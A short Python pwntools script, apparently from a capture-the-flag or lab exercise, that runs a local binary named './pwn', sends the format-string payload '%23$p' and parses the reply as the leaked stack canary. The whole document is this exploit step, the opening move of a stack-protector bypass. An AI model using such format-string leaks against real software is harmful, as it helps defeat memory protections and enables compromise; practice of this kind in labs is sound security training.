from pwn import *

p = process('./pwn')

log.info(p.clean())
p.sendline('%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')